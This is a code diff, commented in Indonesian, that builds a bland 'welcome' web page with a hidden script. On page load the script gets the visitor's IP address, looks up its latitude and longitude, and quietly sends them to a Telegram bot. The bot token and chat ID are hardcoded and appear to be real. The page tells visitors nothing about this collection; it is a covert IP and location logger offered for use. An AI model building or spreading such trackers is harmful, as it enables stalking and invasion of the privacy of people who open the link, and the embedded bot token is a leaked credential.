@@ -1,40 +1,87 @@
-// Mendapatkan IP pengunjung
-$.get("https://api.ipify.org?format=json", function(data) {
-    const ip = data.ip;
-    console.log("IP Pengunjung: " + ip);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Lokasi Pengunjung</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background: #f7f7f7;
+        }
+        .container {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .content {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .content h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <h1>Selamat Datang!</h1>
+            <p>Menunggu data lokasi...</p>
+        </div>
+    </div>
 
-    // Mendapatkan informasi lokasi lebih lengkap berdasarkan IP
-    $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
-        const location = `${locationData.city}, ${locationData.country_name}`;
-        const latitude = locationData.latitude;
-        const longitude = locationData.longitude;
-        
-        console.log("Lokasi Pengunjung: " + location);
-        console.log("Latitude: " + latitude);
-        console.log("Longitude: " + longitude);
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Mendapatkan IP pengunjung
+        $.get("https://api.ipify.org?format=json", function(data) {
+            const ip = data.ip;
+            console.log("IP Pengunjung: " + ip);
 
-        // Kirim data ke Telegram
-        sendToTelegram(ip, location, latitude, longitude);
-    });
-});
+            // Mendapatkan informasi lokasi lebih lengkap berdasarkan IP
+            $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
+                const latitude = locationData.latitude;
+                const longitude = locationData.longitude;
 
-// Fungsi untuk mengirim data ke Telegram
-function sendToTelegram(ip, location, latitude, longitude) {
-    const telegramBotToken = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
-    const chatId = 'YOUR_CHAT_ID'; // Ganti dengan ID chat Telegram Anda
-    const message = `
-========================================
-|            By RizzBotzOffc.          |
-========================================
-|          IP           |  ${ip}
-|          Lokasi       |  ${location}
-|          Latitude     |  ${latitude}
-|          Longitude    |  ${longitude}
-    `;
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-    
-    // Mengirim data ke Telegram
-    $.get(url, function(response) {
-        console.log("Data berhasil dikirim ke Telegram");
-    });
-}
+                console.log("Latitude: " + latitude);
+                console.log("Longitude: " + longitude);
+
+                // Kirim data ke Telegram
+                sendToTelegram(ip, latitude, longitude);
+            }).fail(function(error) {
+                console.log("Error mendapatkan data lokasi: ", error);
+            });
+        });
+
+        // Fungsi untuk mengirim data ke Telegram
+        function sendToTelegram(ip, latitude, longitude) {
+            const telegramBotToken = '7791375028:AAFdGjApp9d47GOH7v9ASKlswwrUXofA2u8'; // Token Bot Telegram Anda
+            const chatId = '5701502998'; // ID Chat Telegram Anda
+            const message = `
+By RizzBotzOffc
+
+IP : ${ip}
+Latitude : ${latitude}
+Longitude : ${longitude}
+            `;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            // Mengirim data ke Telegram
+            $.get(url, function(response) {
+                console.log("Data berhasil dikirim ke Telegram", response);
+            }).fail(function(error) {
+                console.log("Gagal mengirim data ke Telegram", error);
+            });
+        }
+    </script>
+</body>
+</html>
